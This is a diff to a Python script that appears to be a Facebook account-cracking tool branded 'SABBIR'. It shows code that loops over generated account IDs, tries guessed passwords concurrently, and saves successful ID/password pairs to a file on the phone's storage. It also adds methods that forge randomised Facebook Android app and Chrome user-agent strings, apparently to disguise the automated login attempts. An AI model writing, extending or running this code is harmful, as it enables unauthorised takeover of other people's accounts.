@@ -562,7 +562,7 @@ class _G_i_F_t_:
     	    linex()
     	    for love in self.gen:
     	        ids = _Y_e_A_r_ + love
-   	        __OL__.submit(self._O_l_D_,ids)
+    	        __OL__.submit(self._O_l_D_,ids)
     	print("\033[1;37m")
     	linex()
     	print(f"{vb} THE PROCESS HAS COMPLETED...!")
@@ -624,7 +624,7 @@ class _G_i_F_t_:
                     self.oks.append(ids)
                     break
                 elif 'www.facebook.com' in po['error']['message']:
-                    print(f"\r\r{vb}{G}/{W}>{Y}SABBIR-CP{W}< {vcv}{Y} {ids}{G} / {Y}{pas} \033[1;97m")
+                    print(f"\r\r{vb}{G}/{W}>{Y}SABBIR-OK{W}< {vcv}{Y} {ids}{G} / {Y}{pas} \033[1;97m")
                     open('/sdcard/SABBIR-OLD-OK.txt','a').write(ids+'/'+pas+'\n')
                     self.cps.append(ids)
                     break
@@ -632,20 +632,25 @@ class _G_i_F_t_:
     	    self.loop += 1
     	except Exception as e:
             pass
+#-_-_-_-_-_-_-_-<-UA->-_-_-_-_-_-_-_-#
+    def __UPX__(self):
+    	ua1 = "[FBAN/FB4A;FBAV/388.0.0.32.105;FBBV/317616396;FBDM/{density=1.5,width=480,height=800};FBLC/en_US;FBCR/Banglalink;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9070;FBSV/2.3.6;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+    	ua2 = "[FBAN/FB4A;FBAV/381.0.0.29.105;FBBV/316215288;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBRV/FBCR/Teletalk;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1024;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+    	ua3 = "[FBAN/FB4A;FBAV/345.0.0.34.118;FBBV/332957690;FBDM/{density=3.0,width=1080,height=2016};FBLC/en_US;FBRV/FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1721;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+    	ua4 = "[FBAN/FB4A;FBAV/389.0.0.42.111;FBBV/317817218;FBDM/{density=4.0,width=1440,height=2368};FBLC/en_US;FBRV/FBCR/Robi;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto Z (2);FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
+    	ua5 = "[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/315414711;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/Airtel;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+    	__uaxx__ = random.choice([ua1,ua2,ua3,ua4,ua5])
+    	__max__ = '[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';'f'{__uaxx__}'
+    	return str(__max__)
 #-_-_-_-_-_-_-_-<-UA-2->-_-_-_-_-_-_-_-#
-    def __sex__():
-    aV=str(random.choice(range(10,20)))
-    A=f"Mozilla/5.0 (Windows; U; Windows NT {str(random.choice(range(5,7)))}.1; en-US) AppleWebKit/534.{aV} (KHTML, like Gecko) Chrome/{str(random.choice(range(8,12)))}.0.{str(random.choice(range(552,661)))}.0 Safari/534.{aV}"
-    bV=str(random.choice(range(1,36)))
-    bx=str(random.choice(range(34,38)))
-    bz=f"5\x1b[1;97m.{bV}"
-    B=f"Mozilla/5.0 (Windows NT {str(random.choice(range(5,7)))}.{str(random.choice(['2','1']))}) AppleWebKit/{bz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{bz}"
-    cV=str(random.choice(range(1,36)))
-    cx=str(random.choice(range(34,38)))
-    cz=f"5{cx}.{cV}"
-    C=f"Mozilla/5.0 (Windows NT 6.{str(random.choice(['2','1']))}; WOW64) AppleWebKit/{cz} (KHTML, like Gecko) Chrome/{str(random.choice(range(12,42)))}.0.{str(random.choice(range(742,2200)))}.{str(random.choice(range(1,120)))} Safari/{cz}"
-    D=f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.{str(random.choice(range(1,7120)))}.0 Safari/537.36"
-    return random.choice([A,B,C,D])
+    def __OLD__(self):
+    	win_major = random.choice([10, 11])
+    	chrome_major = random.choice(range(120, 123))
+    	chrome_build = random.choice(range(0, 6000))
+    	chrome_patch = random.choice(range(0, 200))
+    	safari_version = 537
+    	ua = (f"Mozilla/5.0 (Windows NT {win_major}.0; Win64; x64) "f"AppleWebKit/{safari_version}.36 (KHTML, like Gecko) "f"Chrome/{chrome_major}.0.{chrome_build}.{chrome_patch} Safari/{safari_version}.36")
+    	return str(ua)
 #-_-_-_-_-_-_-_-<-END-CALL->-_-_-_-_-_-_-_-#
 if __name__ == "__main__":
     _G_i_F_t_()._M_e_N_u_()
